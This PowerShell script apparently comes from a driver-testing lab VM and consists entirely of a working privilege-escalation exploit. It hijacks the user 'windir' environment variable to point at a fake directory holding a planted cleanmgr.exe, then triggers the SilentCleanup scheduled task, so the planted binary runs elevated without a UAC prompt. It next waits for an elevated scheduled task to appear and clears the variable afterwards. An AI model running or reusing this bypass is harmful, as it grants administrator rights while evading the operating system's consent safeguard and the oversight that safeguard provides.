$ErrorActionPreference = 'Continue'
$hijack = Join-Path $env:TEMP 'dl-windir'
New-Item -ItemType Directory -Force -Path (Join-Path $hijack 'system32') | Out-Null
Copy-Item 'Z:\driver-lab\vm\bin\GuestElevateOnce.exe' (Join-Path $hijack 'system32\cleanmgr.exe') -Force
[Environment]::SetEnvironmentVariable('windir', $hijack, 'User')
$env:windir = $hijack
Write-Host "windir=$hijack"
schtasks /Run /TN '\Microsoft\Windows\DiskCleanup\SilentCleanup'
Write-Host "runexit=$LASTEXITCODE"
for ($i = 0; $i -lt 20; $i++) {
    Start-Sleep -Seconds 3
    if (Test-Path 'C:\DriverLab\guest-elevated.json') {
        Write-Host 'MARKER'
        Get-Content 'C:\DriverLab\guest-elevated.json' -Raw
        break
    }
    schtasks /Query /TN Driver3ElevatedWorker 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) { Write-Host 'WORKER'; break }
    Write-Host "wait $i"
}
[Environment]::SetEnvironmentVariable('windir', $null, 'User')
schtasks /Query /TN Driver3ElevatedWorker /FO LIST
if ($LASTEXITCODE -eq 0) { exit 0 } else { exit 1 }
